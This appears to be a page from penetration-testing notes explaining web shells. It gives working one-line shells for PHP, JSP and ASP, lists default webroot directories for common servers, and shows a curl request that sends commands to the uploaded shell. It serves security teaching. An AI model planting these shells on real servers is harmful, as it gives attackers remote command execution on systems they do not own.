---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Web Shell

A **Web Shell** is a technique where we upload a script written on the programming language a website is based on, that lets the app accept commands through HTTP request parameters, and pass them to the server's system to be executed by the internal shell.

This process can be done when we have access to the target's root web directory and we can upload a script to be executed through the web browser.

## <mark style="color:orange;">Basic script</mark>

* Create a script that processes the parameter from the request for the corresponding web language

{% code title="WebShell.php" overflow="wrap" lineNumbers="true" %}
```bash
<?php system($_REQUEST["cmd"]); ?> #PHP server
```
{% endcode %}

{% code title="WebShell.jsp" overflow="wrap" lineNumbers="true" %}
```bash
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %> #Java JSP server
```
{% endcode %}

{% code title="WebShell.asp" overflow="wrap" lineNumbers="true" %}
```bash
<% eval request("cmd") %> #Microsoft .Net server
```
{% endcode %}

* Then upload the script to the webroot directory of the server on the target machine. Some directories for well-known servers are:
  * _/var/www/html/_ for Apache
  * _/usr/local/nginx/html/_ for Nginx
  * _C:\inetpub\wwwroot_ for IIS
  * _C:\xampp\htdocs\\_ for XAMPP

{% code overflow="wrap" lineNumbers="true" %}
```bash
cat $webshellscript > $webroot/$webshellscript
```
{% endcode %}

* Access to the Web Shell by sending a request with the URL parameter defined on the script to send a command as value to execute it

{% code overflow="wrap" lineNumbers="true" %}
```bash
curl http://$IP:$port/shell.php?cmd=$command
```
{% endcode %}
